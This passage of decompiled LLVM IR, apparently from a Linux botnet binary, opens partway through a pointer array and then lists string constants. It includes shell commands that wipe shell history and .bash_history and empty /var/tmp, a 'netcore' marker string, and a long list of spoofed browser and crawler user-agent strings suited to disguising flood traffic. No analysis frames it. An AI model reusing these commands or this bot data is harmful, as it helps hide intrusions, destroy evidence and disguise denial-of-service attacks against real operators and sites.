0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805694c.247, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805694f.248, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @global_var_8056952.249, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056963.250, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_805696c.251, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8056976.252, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_805697e.253, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056983.254, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805698c.255, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056995.256, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_805699b.257, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80569a4.258, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80569ae.259, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_80569b8.260, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056900.230, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056905.231, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80569c2.261, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80569ca.262, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80569cf.263, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80569d8.264, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80569e1.265, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_80569e6.266, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_80569ed.267, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_80569f6.268, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_80569fb.15, i32 0, i32 0), i8* bitcast (i32* @global_var_80569fe.269 to i8*), i8* bitcast (i32* @global_var_8056a00.270 to i8*), i8* bitcast (i32* @global_var_8056a02.271 to i8*), i8* bitcast (i32* @global_var_8056a04.272 to i8*), i8* bitcast (i32* @global_var_8056a06.273 to i8*), i8* bitcast (i32* @global_var_8056a08.274 to i8*), i8* bitcast (i32* @global_var_8056a0a.275 to i8*), i8* bitcast (i32* @global_var_8056a0c.276 to i8*), i8* bitcast (i32* @global_var_8056a0e.277 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056a10.278, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056a13.279, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056a16.280, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056a19.281, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056a1c.282, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056a1f.283, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056a22.284, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056a25.285, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056a28.286, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056a2b.287, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8056a2e.288, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056a31.289, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056a37.290, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056a3c.291, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056a41.292, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056a46.293, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056a4c.294, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8056a53.295, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8056a5b.296, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8056a63.297, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056a6b.298, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8056a74.299, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056a7c.300, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056a83.301, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8056a8c.302, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056a94.303, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056a99.304, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056aa0.305, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056aa7.306, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_8056aae.307, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056ab5.308, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_8056abb.309, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_8056ac4.310, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8056aca.311, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @global_var_8056acf.312, i32 0, i32 0)]
@global_var_80579d9.314 = constant i32 1094778914
@global_var_80579db.315 = constant [16 x i8] c"AAAAAAAAnetcore\00"
@global_var_80579ec.316 = constant [3 x i8] c"AA\00"
@global_var_8057b80.317 = constant [22 x i8] c"history -c;history -w\00"
@global_var_8057b96.318 = constant [30 x i8] c"cd /root;rm -rf .bash_history\00"
@global_var_8057bb4.319 = constant [21 x i8] c"cd /var/tmp; rm -f *\00"
@global_var_8057bcc.320 = constant [62 x i8] c"Mozilla/5.0 (compatible; Konqueror/3.0; i686 Linux; 20021117)\00"
@global_var_8057c0c.321 = constant [64 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) SkypeUriPreview Preview/0.5\00"
@global_var_8057c4c.322 = constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00"
@global_var_8057cdc.323 = constant [55 x i8] c"Mozilla/5.0 Galeon/1.0.3 (X11; Linux i686; U;) Gecko/0\00"
@global_var_8057d14.324 = constant [32 x i8] c"Opera/6.04 (Windows XP; U) [en]\00"
@global_var_8057d34.325 = constant [24 x i8] c"Opera/9.99 (X11; U; sk)\00"
@global_var_8057d4c.326 = constant [86 x i8] c"Mozilla/6.0 (Future Star Technologies Corp. Star-Blade OS; U; en-US) iNet Browser 2.5\00"
@global_var_8057da4.327 = constant [157 x i8] c"Mozilla/5.0(iPad; U; CPU iPhone OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B314 Safari/531.21.10gin_lib.cc\00"
@global_var_8057e44.328 = constant [82 x i8] c"Mozilla/5.0 Galeon/1.2.9 (X11; Linux i686; U;) Gecko/20021213 Debian/1.2.9-0.bunk\00"
@global_var_8057e98.329 = constant [115 x i8] c"Mozilla/5.0 Slackware/13.37 (X11; U; Linux x86_64; en-US) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.41\00"
@global_var_8057f0c.330 = constant [63 x i8] c"Mozilla/5.0 (compatible; iCab 3.0.3; Macintosh; U; PPC Mac OS)\00"
@global_var_8057f4c.331 = constant [182 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00"
@global_var_8058004.332 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00"
@global_var_8058058.333 = constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00"
@global_var_80580b0.334 = constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00"
@global_var_8058108.335 = constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00"
@global_var_8058148.336 = constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00"
@global_var_8058190.337 = constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00"
@global_var_80581e8.338 = constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00"
@global_var_8058254.339 = constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00"
@global_var_80582ac.340 = constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00"
@global_var_80582fc.341 = constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00"
@global_var_8058320.342 = constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00"
@global_var_805837b.343 = constant [15 x i8] c"wii libnup/1.0\00"
@global_var_805838c.344 = constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00"
@global_var_80583bc.345 = constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00"
@global_var_80583e0.346 = constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00"
@global_var_8058402.347 = constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00"
@global_var_805841c.348 = constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_805845c.349 = constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00"
@global_var_80584ac.350 = constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00"
@global_var_80584f8.351 = constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00"
@global_var_8058534.352 = constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00"
@global_var_8058590.353 = constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00"
@global_var_80585f8.354 = constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00"
@global_var_805866c.355 = constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00"
@global_var_80586e4.356 = constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00"
@global_var_8058740.357 = constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00"
@global_var_8058794.358 = constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00"
@global_var_805881c.359 = constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_8058870.360 = constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00"
@global_var_80588d8.361 = constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00"
@global_var_8058934.362 = constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00"
@global_var_8058984.363 = constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00"
@global_var_80589c8.364 = constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00"
@global_var_8058a1c.365 = constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00"
@global_var_8058a68.366 = constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00"
@global_var_8058aac.367 = constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00"
@global_var_8058b00.368 = constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_8058b6c.369 = constant [110 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00"
@global_var_8058bdc.370 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00"
@global_var_8058c38.371 = constant [116 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/4.0.219.6 Safari/532.1\00"
@global_var_8058cac.372 = constant [110 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_8058d1c.373 = constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00"
@global_var_8058db4.374 = constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.2; Win64; x64; Trident/4.0)\00"
@global_var_8058e00.375 = constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00"
@global_var_8058e68.376 = constant [58 x i8] c"Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)\00"
@global_var_8058ea4.377 = constant [47 x i8] c"Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)\00"
@global_var_8058ed4.378 = constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00"
@global_var_8058f14.379 = constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00"
@global_var_8058f60.380 = constant [83 x i8] c"Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\00"
@global_var_8058fb4.381 = constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00"
@global_var_8059064.382 = constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/3.0; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00"
@global_var_80590cc.383 = constant [102 x i8] c"Mozilla/5.0 (compatible; BecomeBot/2.3; MSIE 6.0 compatible; +http://www.become.com/site_owners.html)\00"
@global_var_8059134.384 = constant [80 x i8] c"Mozilla/5.0 (compatible; BeslistBot; nl; BeslistBot 1.0; http://www.beslist.nl/\00"
@global_var_8059184.385 = constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00"
@global_var_80591bc.386 = constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00"
@global_var_80591ec.387 = constant [91 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 DLC (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_8059248.388 = constant [105 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_80592b4.389 = constant [102 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 Dead Link Checker (wn.dlc@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_805931c.390 = constant [87 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_8059374.391 = constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-16.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_80593d0.392 = constant [90 x i8] c"Mozilla/4.0 compatible ZyBorg/1.0 (wn-14.zyborg@looksmart.net; http://www.WISEnutbot.com)\00"
@global_var_805942c.393 = constant [86 x i8] c"Mozilla/5.0 (compatible; YodaoBot/1.0; http://www.yodao.com/help/webmaster/spider/; )\00"
@global_var_8059484.394 = constant [93 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://sp.ask.com/docs/about/tech_crawling.html)\00"
@global_var_80594e4.395 = constant [97 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma; +http://about.ask.com/en/docs/about/webmasters.shtml)\00"
@global_var_8059548.396 = constant [43 x i8] c"Mozilla/2.0 (compatible; Ask Jeeves/Teoma)\00"
@global_var_8059574.397 = constant [52 x i8] c"TerrawizBot/1.0 (+http://www.terrawiz.com/bot.html)\00"
@global_var_80595a8.398 = constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00"
@global_var_80595c8.399 = constant [31 x i8] c"TheSuBot/0.1 (www.thesubot.de)\00"
@global_var_80595e8.400 = constant [85 x i8] c"FAST-WebCrawler/3.8 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_8059640.401 = constant [94 x i8] c"FAST-WebCrawler/3.7/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00"
@global_var_80596a0.402 = constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_80596f8.403 = constant [94 x i8] c"FAST-WebCrawler/3.6/FirstPage (atw-crawler at fast dot no;http://fast.no/support/crawler.asp)\00"
@global_var_8059758.404 = constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00"
@global_var_80597b0.405 = constant [31 x i8] c"FAST-WebCrawler/3.x Multimedia\00"
@global_var_80597d0.406 = constant [37 x i8] c"Mozilla/4.0 (compatible: FDSE robot)\00"
@global_var_80597f8.407 = constant [63 x i8] c"findlinks/2.0.1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_8059838.408 = constant [69 x i8] c"findlinks/1.1.6-beta6 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_8059880.409 = constant [69 x i8] c"findlinks/1.1.6-beta4 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_80598c8.410 = constant [69 x i8] c"findlinks/1.1.6-beta1 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_8059910.411 = constant [69 x i8] c"findlinks/1.1.5-beta7 (+http://wortschatz.uni-leipzig.de/findlinks/)\00"
@global_var_8059958.412 = constant [81 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; rv:1.0.2) Gecko/20030311 Beonex/0.8.2-stable\00"
@global_var_80599ac.413 = constant [78 x i8] c"Mozilla/5.0 (Windows; U; WinNT; en; Preview) Gecko/20020603 Beonex/0.8-stable\00"
@global_var_80599fc.414 = constant [105 x i8] c"Mozilla/5.0 (X11; U; Linux i686; nl; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2 (Debian-1.99+2.0b2+dfsg-1)\00"
@global_var_8059a68.415 = constant [81 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1b2) Gecko/20060821 BonEcho/2.0b2\00"
@global_var_8059abc.416 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1b2) Gecko/20060826 BonEcho/2.0b2\00"
@global_var_8059b18.417 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.0; en-US; rv:1.8.1b2) Gecko/20060831 BonEcho/2.0b2\00"
@global_var_8059b74.418 = constant [97 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-GB; rv:1.8.1b1) Gecko/20060601 BonEcho/2.0b1 (Ubuntu-edgy)\00"
@global_var_8059bd8.419 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a3) Gecko/20060526 BonEcho/2.0a3\00"
@global_var_8059c34.420 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_8059c90.421 = constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_8059cec.422 = constant [96 x i8] c"Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1a2) Gecko/20060512 BonEcho/2.0a2\00"
@global_var_8059d4c.423 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: webetrex)\00"
@global_var_8059d94.424 = constant [150 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: unblock4myspace)AppEngine-Google; (+http://code.google.com/appengine; appid: tunisproxy)\00"
@global_var_8059e2c.425 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-in-rs)\00"
@global_var_8059e78.426 = constant [73 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_8059ec4.427 = constant [78 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: moelonepyaeshan)\00"
@global_var_8059f14.428 = constant [71 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mirrorrr)\00"
@global_var_8059f5c.429 = constant [84 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: mapremiereapplication)\00"
@global_var_8059fb0.430 = constant [79 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: longbows-hideout)\00"
@global_var_805a000.431 = constant [70 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: eduas23)\00"
@global_var_805a048.432 = constant [74 x i8] c"AppEngine-Google; (+http://code.google.com/appengine; appid: craigserver)\00"
@global_var_805a094.433 = constant [73 x i8] c"AppEngine-Google; ( http://code.google.com/appengine; appid: proxy-ba-k)\00"
@global_var_805a0e0.434 = constant [71 x i8] c"magpie-crawler/1.1 (U; Linux amd64; en-GB; +http://www.brandwatch.net)\00"
@global_var_805a128.435 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.4; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_805a178.436 = constant [80 x i8] c"Mozilla/5.0 (compatible; MJ12bot/v1.2.3; http://www.majestic12.co.uk/bot.php?+)\00"
@global_var_805a1c8.437 = constant [51 x i8] c"MJ12bot/v1.0.8 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_805a1fc.438 = constant [51 x i8] c"MJ12bot/v1.0.7 (http://majestic12.co.uk/bot.php?+)\00"
@global_var_805a230.439 = constant [72 x i8] c"Mozilla/5.0 (compatible; MojeekBot/2.0; http://www.mojeek.com/bot.html)\00"
@global_var_805a278.440 = constant [54 x i8] c"MojeekBot/0.2 (archi; http://www.mojeek.com/bot.html)\00"
@global_var_805a2b0.441 = constant [77 x i8] c"Moreoverbot/5.1 ( http://w.moreover.com; webmaster@moreover.com) Mozilla/5.0\00"
@global_var_805a300.442 = constant [68 x i8] c"Moreoverbot/5.00 (+http://www.moreover.com; webmaster@moreover.com)\00"
@global_var_805a344.443 = constant [47 x i8] c"msnbot/1.0 (+http://search.msn.com/msnbot.htm)\00"
@global_var_805a374.444 = constant [47 x i8] c"msnbot/0.9 (+http://search.msn.com/msnbot.htm)\00"
@global_var_805a3a4.445 = constant [48 x i8] c"msnbot/0.11 ( http://search.msn.com/msnbot.htm)\00"
@global_var_805a3d4.446 = constant [46 x i8] c"MSNBOT/0.1 (http://search.msn.com/msnbot.htm)\00"
@global_var_805a404.447 = constant [71 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; +http://www.chainn.com/mxbot.html)\00"
@global_var_805a44c.448 = constant [70 x i8] c"Mozilla/5.0 (compatible; mxbot/1.0; http://www.chainn.com/mxbot.html)\00"
@global_var_805a494.449 = constant [55 x i8] c"NetResearchServer/4.0(loopimprovements.com/robot.html)\00"
@global_var_805a4cc.450 = constant [55 x i8] c"NetResearchServer/3.5(loopimprovements.com/robot.html)\00"
@global_var_805a504.451 = constant [55 x i8] c"NetResearchServer/2.8(loopimprovements.com/robot.html)\00"
@global_var_805a53c.452 = constant [55 x i8] c"NetResearchServer/2.7(loopimprovements.com/robot.html)\00"
@global_var_805a574.453 = constant [55 x i8] c"NetResearchServer/2.5(loopimprovements.com/robot.html)\00"
@global_var_805a5ac.454 = constant [83 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html)\00"
@global_var_805a600.455 = constant [55 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;SV1)\00"
@global_var_805a638.456 = constant [84 x i8] c"Mozilla/5.0+(compatible;+Baiduspider/2.0;++http://www.baidu.com/search/spider.html)\00"
@global_var_805a68c.457 = constant [113 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)\00"
@global_var_805a700.458 = constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)\00"
@global_var_805a748.459 = constant [117 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET \00"
@global_var_805a7c0.460 = constant [50 x i8] c"Googlebot/2.1 (http://www.googlebot.com/bot.html)\00"
@global_var_805a7f4.461 = constant [35 x i8] c"Opera/9.20 (Windows NT 6.0; U; en)\00"
@global_var_805a818.462 = constant [133 x i8] c"YahooSeeker/1.2 (compatible; Mozilla 4.0; MSIE 5.5; yahooseeker at yahoo-inc dot com ; http://help.yahoo.com/help/us/shop/merchant/)\00"
@global_var_805a8a0.463 = constant [109 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.1.1) Gecko/20061205 Iceweasel/2.0.0.1 (Debian-2.0.0.1+dfsg-2)\00"
@global_var_805a910.464 = constant [120 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)\00"
@global_var_805a988.465 = constant [50 x i8] c"Opera/10.00 (X11; Linux i686; U; en) Presto/2.2.0\00"
@global_var_805a9bc.466 = constant [160 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.503l3; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; MSOffice 12)\00"
@global_var_805aa5c.467 = constant [113 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.0; he-IL) AppleWebKit/528.16 (KHTML, like Gecko) Version/4.0 Safari/528.16\00"
